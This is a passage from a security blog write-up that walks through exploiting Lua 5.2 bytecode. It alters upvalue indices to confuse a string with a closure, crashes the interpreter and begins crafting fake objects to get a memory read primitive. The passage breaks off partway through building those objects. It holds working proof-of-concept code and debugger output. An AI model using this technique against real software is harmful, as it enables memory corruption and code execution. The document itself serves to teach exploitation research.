</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> target
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>      print(foo)
</span></span><span style="display:flex;"><span>      print(bar)
</span></span><span style="display:flex;"><span>      print(target)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>)()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Modify upvalue index of target to be idx + 1</span>
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> poc:gsub(<span style="color:#e6db74">&#34;(</span><span style="color:#ae81ff">\x00\x00\x01\x00\x01\x01\x01</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;%1</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> load(poc)
</span></span><span style="display:flex;"><span>poc()
</span></span></code></pre></div><p>Here we <em>dump the bytecode</em> of the function with <code>string.dump</code> and then modify the index of the last upvalue with a substitution. We use <code>&quot;(\x00\x00\x01\x00\x01\x01\x01)\x02&quot;</code> as the pattern because each upvalue has one byte to indicate if it is located in the stack and another to indicate the index, making it unique enough for our purpose.</p>
<p>Execution of the <strong>manipulated bytecode</strong> reveals something interesting:</p>
<pre tabindex="0"><code>[MemoryCorruption src]$ ./lua poc.lua 
nil
nil
LClosure: 0x7a6d00
</code></pre>
<div class="alert alert-warning">An <em>unmodified version of Lua</em> will return <code>function</code> instead of <code>LClosure</code>, as the default <code>print</code> function considers closures functions
</div>

<p>Instead of <code>nil</code>, we got an <code>LClosure</code>, <em>but what is an LClosure?</em> To understand it, <strong>we need to know how functions work in Lua</strong></p>
<h4 id="closures-and-prototypes">Closures and Prototypes</h4>
<p><strong>Prototypes</strong> are created when loading bytecode or when parsing the source code of a Lua script. As such, we could say that <em>prototypes</em> are the <strong>real functions</strong>, as they
contain all the information we would commonly associate with a function, like its bytecode, the start and end line of source code where it was defined, constants used&hellip;</p>
<p>They act kinda as a <em>template</em> for functions</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Proto</span> {
</span></span><span style="display:flex;"><span>  CommonHeader;
</span></span><span style="display:flex;"><span>  TValue <span style="color:#f92672">*</span>k;  <span style="color:#75715e">/* constants used by the function */</span>
</span></span><span style="display:flex;"><span>  Instruction <span style="color:#f92672">*</span>code;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Proto</span> <span style="color:#f92672">**</span>p;  <span style="color:#75715e">/* functions defined inside the function */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>lineinfo;  <span style="color:#75715e">/* map from opcodes to source lines (debug information) */</span>
</span></span><span style="display:flex;"><span>  LocVar <span style="color:#f92672">*</span>locvars;  <span style="color:#75715e">/* information about local variables (debug information) */</span>
</span></span><span style="display:flex;"><span>  Upvaldesc <span style="color:#f92672">*</span>upvalues;  <span style="color:#75715e">/* upvalue information */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> <span style="color:#a6e22e">Closure</span> <span style="color:#f92672">*</span>cache;  <span style="color:#75715e">/* last created closure with this prototype */</span>
</span></span><span style="display:flex;"><span>  TString  <span style="color:#f92672">*</span>source;  <span style="color:#75715e">/* used for debug information */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sizeupvalues;  <span style="color:#75715e">/* size of &#39;upvalues&#39; */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sizek;  <span style="color:#75715e">/* size of `k&#39; */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sizecode;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sizelineinfo;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sizep;  <span style="color:#75715e">/* size of `p&#39; */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sizelocvars;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> linedefined;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> lastlinedefined;
</span></span><span style="display:flex;"><span>  GCObject <span style="color:#f92672">*</span>gclist;
</span></span><span style="display:flex;"><span>  lu_byte numparams;  <span style="color:#75715e">/* number of fixed parameters */</span>
</span></span><span style="display:flex;"><span>  lu_byte is_vararg;
</span></span><span style="display:flex;"><span>  lu_byte maxstacksize;  <span style="color:#75715e">/* maximum stack used by this function */</span>
</span></span><span style="display:flex;"><span>} Proto;
</span></span></code></pre></div><p>On the other hand, <strong>Closures</strong> are created <strong>during execution of the Lua script</strong> and associate a <strong>Prototype</strong> with its <strong>Upvalues</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">LClosure</span> {
</span></span><span style="display:flex;"><span>  ClosureHeader;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Proto</span> <span style="color:#f92672">*</span>p; <span style="color:#75715e">/* Function associated with the LClosure */</span>
</span></span><span style="display:flex;"><span>  UpVal <span style="color:#f92672">*</span>upvals[<span style="color:#ae81ff">1</span>];  <span style="color:#75715e">/* list of upvalues */</span>
</span></span><span style="display:flex;"><span>} LClosure;
</span></span></code></pre></div><p>The existence of <strong>Closures</strong> is what allows Lua to <strong>implement upvalues</strong>, as they abstract a function from its <strong>upvals</strong>. This is important as <strong>the same function can have different
upvals</strong> on each call</p>
<p>We can see this mechanism in work with a function that returns a counter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">createCounter</span>()
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- On each call, a new local variable is created</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">function</span> ()
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">-- Count is an upval of this function</span>
</span></span><span style="display:flex;"><span>          count <span style="color:#f92672">=</span> count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> count
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>first_counter <span style="color:#f92672">=</span> createCounter()
</span></span><span style="display:flex;"><span>second_counter <span style="color:#f92672">=</span> createCounter()
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Increase the first counter</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Counter 1: &#34;</span> <span style="color:#f92672">..</span> first_counter())
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Increase the second counter</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Counter 2: &#34;</span> <span style="color:#f92672">..</span> second_counter())
</span></span></code></pre></div><p>In this code, the <code>createCounter</code> function returns a new function that can be used to increase an <strong>upvalue</strong> of the <code>createCounter</code> function. As a new <code>count</code> variable is created on each call, the function will
return a different <code>LCLosure</code> when called. The same <strong>prototype</strong> will be used, as <em>they are the same funcion</em>, but a different <strong>upval</strong> will be associated with it <sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup></p>
<h4 id="wait-is-all-tvalues">Wait, is all TValues?</h4>
<p>By modifying the index of the upvalue, we got a reference to the current function closure, that is because <code>LClosures</code> are <strong>pushed to the stack on creation</strong> and <strong>just before upvalues are asigned to it</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** create a new Lua closure, push it in the stack, and initialize
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** its upvalues.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pushclosure</span> (lua_State <span style="color:#f92672">*</span>L, Proto <span style="color:#f92672">*</span>p, UpVal <span style="color:#f92672">**</span>encup, StkId base,
</span></span><span style="display:flex;"><span>                         StkId ra) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nup <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>sizeupvalues;
</span></span><span style="display:flex;"><span>  Upvaldesc <span style="color:#f92672">*</span>uv <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>upvalues;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>  Closure <span style="color:#f92672">*</span>ncl <span style="color:#f92672">=</span> luaF_newLclosure(L, nup);
</span></span><span style="display:flex;"><span>  ncl<span style="color:#f92672">-&gt;</span>l.p <span style="color:#f92672">=</span> p;
</span></span><span style="display:flex;"><span>  setclLvalue(L, ra, ncl);  <span style="color:#75715e">/* anchor new closure in stack */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> nup; i<span style="color:#f92672">++</span>) {  <span style="color:#75715e">/* fill in its upvalues */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (uv[i].instack)  <span style="color:#75715e">/* upvalue refers to local variable? */</span>
</span></span><span style="display:flex;"><span>      ncl<span style="color:#f92672">-&gt;</span>l.upvals[i] <span style="color:#f92672">=</span> luaF_findupval(L, base <span style="color:#f92672">+</span> uv[i].idx);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>  <span style="color:#75715e">/* get upvalue from enclosing function */</span>
</span></span><span style="display:flex;"><span>      ncl<span style="color:#f92672">-&gt;</span>l.upvals[i] <span style="color:#f92672">=</span> encup[uv[i].idx];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  luaC_barrierproto(L, p, ncl);
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>cache <span style="color:#f92672">=</span> ncl;  <span style="color:#75715e">/* save it on cache for reuse */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The position of the <code>LClosure</code> in the stack depends on the opcode <code>CLOSURE</code>, which as the name indicates, is reponsible for the creation of closures in Lua and is defined as:</p>
<pre tabindex="0"><code>R(A) := closure(KPROTO[Bx])
</code></pre><p>This basically means to create a new <strong>Closure</strong> based on the <strong>prototype at position Bx</strong> of the current <em>function prototype</em> array of prototypes (function prototypes are stored in the prototype of the function that defined it), and store it at position <code>R(A)</code>, which is a macro that means <code>base + A</code>, so at an offset from the current function stack (which seems to always be just after the local variables).</p>
<p>This explains why when we modified the index of the last <em>upval</em> we got the <code>LClosure</code> of the function</p>
<pre tabindex="0"><code>function (4 instructions at 0x225b540)
0 params, 4 slots, 1 upvalue, 3 locals, 0 constants, 1 function
	1	[19]	LOADNIL  	0 2
	2	[28]	CLOSURE  	3 0	; 0x225bc80
	3	[22]	CALL     	3 1 1
	4	[29]	RETURN   	0 1
constants (0) for 0x225b540:
locals (3) for 0x225b540:
	0	foo	2	5
	1	bar	2	5
	2	target	2	5
upvalues (1) for 0x225b540:
	0	_ENV	0	0
</code></pre><p>As our function had <strong>three locals</strong>, the <code>CLOSURE</code> opcode has <code>3</code> as the <code>A</code> parameter, meaning that the <code>LClosure</code> is stored at <code>base + 3</code>. When we modified the last upval to point to the index <strong>3</strong>, we got
the <code>TValue</code> stored at <code>base + 3</code>, that is, the <strong>LClosure</strong>.</p>
<p>As closures are <strong>first class citizens</strong> in Lua, they are also a <code>TValue</code>, so they are no more especial than any other variable.</p>
<h4 id="toctou-type-of-check--type-of-use">TOCTOU: Type of Check != Type of Use</h4>
<p>We just learned that <em>Closures</em> are like any other variable in Lua. This arises a question, <em>what prevents a user from calling a variable like a string as a function and crash Lua?</em></p>
<p>The answer, as you can imagine, is a <strong>type check</strong> when trying to call a <code>TValue</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">luaD_precall</span> (lua_State <span style="color:#f92672">*</span>L, StkId func, <span style="color:#66d9ef">int</span> nresults) {
</span></span><span style="display:flex;"><span>  lua_CFunction f;
</span></span><span style="display:flex;"><span>  CallInfo <span style="color:#f92672">*</span>ci;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> n;  <span style="color:#75715e">/* number of arguments (Lua) or returns (C) */</span>
</span></span><span style="display:flex;"><span>  ptrdiff_t funcr <span style="color:#f92672">=</span> savestack(L, func);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (ttype(func)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> LUA_TLCF:  <span style="color:#75715e">/* light C function */</span>
</span></span><span style="display:flex;"><span>      f <span style="color:#f92672">=</span> fvalue(func);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> Cfunc;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> LUA_TCCL: {  <span style="color:#75715e">/* C closure */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Redacted */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> LUA_TLCL: {  <span style="color:#75715e">/* Lua function: prepare its call */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Redacted */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> {  <span style="color:#75715e">/* not a function */</span>
</span></span><span style="display:flex;"><span>      func <span style="color:#f92672">=</span> tryfuncTM(L, func);  <span style="color:#75715e">/* retry with &#39;function&#39; tag method */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> luaD_precall(L, func, nresults);  <span style="color:#75715e">/* now it must be a function */</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This seems like a banal question, but it has <em>implicit consequences</em>, if the type of the <code>TValue</code> was checked before being able to call it, as it makes sense to do, why would they check the type <strong>during</strong> execution of the function?</p>
<p><em>What happens if we replace the LClosure with other type of TValue? Are there type checks to prevent this?</em> Let&rsquo;s experiment with this idea and replace the <code>LClosure</code> with a <code>String</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> string.dump(<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> foo
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> bar
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> target
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>      print(foo)
</span></span><span style="display:flex;"><span>      print(bar)
</span></span><span style="display:flex;"><span>      print(target)
</span></span><span style="display:flex;"><span>      target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAA&#34;</span> <span style="color:#75715e">-- Replace LClosure with String</span>
</span></span><span style="display:flex;"><span>      print(target)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>)()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Modify upvalue index of target to be idx + 1</span>
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> poc:gsub(<span style="color:#e6db74">&#34;(</span><span style="color:#ae81ff">\x00\x00\x01\x00\x01\x01\x01</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;%1</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> load(poc)
</span></span><span style="display:flex;"><span>poc()
</span></span></code></pre></div><p>Not much seems to happen:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>[MemoryCorruption src]<span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span>lua <span style="color:#f92672">~/</span>Downloads<span style="color:#f92672">/</span>lua<span style="color:#f92672">-</span><span style="color:#ae81ff">5.2.1</span><span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>poc.lua 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>LClosure: <span style="color:#ae81ff">0x1c57e20</span>
</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p><em>Why is that?</em> As we are not calling any other function after overwritting the <code>LClosure</code>, <strong>its value is not being used</strong>.</p>
<p><em>But what happens if we corrupt the previous <code>LClosure</code>? How does that affect the execution when Lua returns to the function?</em> Let&rsquo;s see it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> string.dump(<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> foo
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> bar
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> target
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>() <span style="color:#75715e">-- [1] target points to this function LClosure</span>
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>        print(foo)
</span></span><span style="display:flex;"><span>        print(bar)
</span></span><span style="display:flex;"><span>        print(target)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- [2] The inner function overwrites the outer function LClosure</span>
</span></span><span style="display:flex;"><span>        target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- [3] Lua returns to the corrupted LClosure</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">end</span>)()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>)()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Modify upvalue index of target to be idx + 1</span>
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> poc:gsub(<span style="color:#e6db74">&#34;(</span><span style="color:#ae81ff">\x00\x00\x01\x00\x01\x01\x01</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;%1</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> load(poc)
</span></span><span style="display:flex;"><span>poc()
</span></span></code></pre></div><p>This time the inner function is overwritting the <code>LClosure</code> of the outer function instead of modiying their own <code>LClosure</code></p>
<pre tabindex="0"><code>[MemoryCorruption src]$ ./lua poc.lua 
nil
nil
LClosure: 0x21b1130
Segmentation fault (core dumped)
</code></pre><p>We can see in GDB that the crash happens because Lua is <strong>trying to use our TValue as a LClosure in the change of frame code</strong></p>
<pre tabindex="0"><code>[ REGISTERS ]
*RAX  0x4141414141414141 (&#39;AAAAAAAA&#39;)
[ DISASM ]
  0x419d17 &lt;luaV_execute+56&gt;    mov    rax, qword ptr [rax + 0x10]
[ SOURCE ]
In file: lua-5.2.1/src/lvm.c
   604   TValue *k;
   605   StkId base;
   606  newframe:  /* reentry point when frame changes (call/return) */
   607   lua_assert(ci == L-&gt;ci);
   608   cl = clLvalue(ci-&gt;func);
  609   k = cl-&gt;p-&gt;k;
   610   base = ci-&gt;u.l.base;
   611   /* main loop of interpreter */
   612   for (;;) {
   613     Instruction i = *(ci-&gt;u.l.savedpc++);
   614     StkId ra;
</code></pre><p>These are great news, as now the <code>cl</code> variable, that points to the current <code>LClosure</code> in <strong>execution</strong>, is pointing to our <code>TString</code> and not to the real <code>LClosure</code>.</p>
<p>This is possible because the <strong>type check in the return opcode is not enforced</strong>. Instead of forcing a type check, like in the <code>luaD_precall</code> function before a call, the <code>lua_assert</code> macro is used, and as we learned before, it <strong>does nothing by default</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>vmcasenb(OP_RETURN,
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> b <span style="color:#f92672">=</span> GETARG_B(i);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (b <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) L<span style="color:#f92672">-&gt;</span>top <span style="color:#f92672">=</span> ra<span style="color:#f92672">+</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cl<span style="color:#f92672">-&gt;</span>p<span style="color:#f92672">-&gt;</span>sizep <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) luaF_close(L, base);
</span></span><span style="display:flex;"><span>  b <span style="color:#f92672">=</span> luaD_poscall(L, ra);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(ci<span style="color:#f92672">-&gt;</span>callstatus <span style="color:#f92672">&amp;</span> CIST_REENTRY))  <span style="color:#75715e">/* &#39;ci&#39; still the called one */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;  <span style="color:#75715e">/* external invocation: return */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {  <span style="color:#75715e">/* invocation via reentry: continue execution */</span>
</span></span><span style="display:flex;"><span>    ci <span style="color:#f92672">=</span> L<span style="color:#f92672">-&gt;</span>ci;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (b) L<span style="color:#f92672">-&gt;</span>top <span style="color:#f92672">=</span> ci<span style="color:#f92672">-&gt;</span>top;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// This type check would prevent this type confusion,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// but is disabled by default
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lua_assert(isLua(ci));
</span></span><span style="display:flex;"><span>    lua_assert(GET_OPCODE(<span style="color:#f92672">*</span>((ci)<span style="color:#f92672">-&gt;</span>u.l.savedpc <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">==</span> OP_CALL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> newframe;  <span style="color:#75715e">/* restart luaV_execute over new Lua function */</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>To understand how we can leverage this, we first need to know <strong>what attributes we are in control of</strong> when we confuse a <code>TString</code> with a <code>LClosure</code></p>
<table>
<thead>
<tr>
<th>Bytes</th>
<th>LClosure</th>
<th>TString</th>
</tr>
</thead>
<tbody>
<tr>
<td>0-7</td>
<td>GCObject *next</td>
<td>GCObject *next</td>
</tr>
<tr>
<td>8</td>
<td>lu_byte tt</td>
<td>lu_byte tt</td>
</tr>
<tr>
<td>9</td>
<td>lu_byte marked</td>
<td>lu_byte marked</td>
</tr>
<tr>
<td>10</td>
<td>lu_byte nupvalues</td>
<td>lu_byte extra</td>
</tr>
<tr>
<td>11-15</td>
<td>Padding</td>
<td>Padding + unsigned int hash</td>
</tr>
<tr>
<td>16-23</td>
<td>GCObject *gclist</td>
<td>size_t len</td>
</tr>
<tr>
<td>24-31</td>
<td><strong>Proto *p</strong></td>
<td><strong>start of user content</strong></td>
</tr>
<tr>
<td>32-40</td>
<td><strong>Upval **upval</strong></td>
<td><strong>rest of string</strong></td>
</tr>
</tbody>
</table>
<p>As we can see, <strong>the type confusion gives us total control</strong> of both the <code>Proto</code> and <code>Upval</code> pointers, as the user content of a <strong>string</strong> is stored in those offsets.</p>
<p>This is important because we gain control over the <strong>pointer to the function prototype and the array of upvalues of the current frame</strong>. If we point these pointers to an area of memory we control, for example, <em>another string</em>, we could create <strong>fake objects</strong>, the <strong>most powerful primitive in a dynamic language</strong>.</p>
<h3 id="creating-fake-objects">Creating Fake Objects</h3>
<p>From this point, there are two paths, we either create a Fake <code>Proto</code> that points to an array of fake <code>TValues</code>, or we can create a fake <code>UpVal</code> array that points to our <code>TValues</code>. They lead to the same
outcome, so I recomment following the <em>Constants</em> path, as you need <strong>less padding</strong>, and also <strong>regain the ability to use constants</strong> in your function, which is nice</p>
<p>
  
    <img src="/posts/rce-lua-factorio/fakeobjs.svg" alt="Fake Objects" title="Possible paths to create Fake Objects from a LClosure we control"
        loading="lazy"
        referrerpolicy="same-origin"
    >
          <figcaption>Possible paths to create Fake Objects from a LClosure we control</figcaption>
  </p>
<p>Let&rsquo;s start by creating a <strong>fake string</strong>. Fake strings are interesting as they can be used as a <strong>read primitive</strong> by creating a one with the <strong>max length possible</strong>.</p>
<p>This is useful in many cases and can even be
the end goal of our exploit (as we might just want to <em>demonstrate access to customer data in memory</em>)</p>
<p>As we will follow the <strong>path of constants</strong>, we need to create:</p>
<ul>
<li>The Fake String</li>
<li>An array of <code>TValues</code>, with one pointing to our fake string</li>
<li>A Fake <code>Proto</code> that points to the Array of <code>TValues</code></li>
<li>A Fake <code>LClosure</code> that points to our fake <code>Proto</code></li>
</ul>
<h4 id="1-fake-string">1. Fake String</h4>
<p>In Lua, strings are represented with the <code>TString</code> union:</p>

<div class="alert alert-info">While crafting fake objects, use the definition of the structure provided by GDB, as it includes <strong>paddings</strong>
</div>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> ptype <span style="color:#f92672">/</span>o TString
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">union</span> <span style="color:#a6e22e">TString</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     8 */</span>    L_Umaxalign dummy;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                    24 */</span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      0      |       8 */</span>        GCObject <span style="color:#f92672">*</span>next;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      8      |       1 */</span>        lu_byte tt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      9      |       1 */</span>        lu_byte marked;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     10      |       1 */</span>        lu_byte extra;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  1-byte hole      */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     12      |       4 */</span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> hash;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     16      |       8 */</span>        size_t len;
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">/* total size (bytes):   24 */</span>
</span></span><span style="display:flex;"><span>} tsv;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* total size (bytes):   24 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As our goal is to <strong>create a string with an arbitrary len</strong>, our string will have 24 bytes where the last 8 bytes represent the length of our string</p>
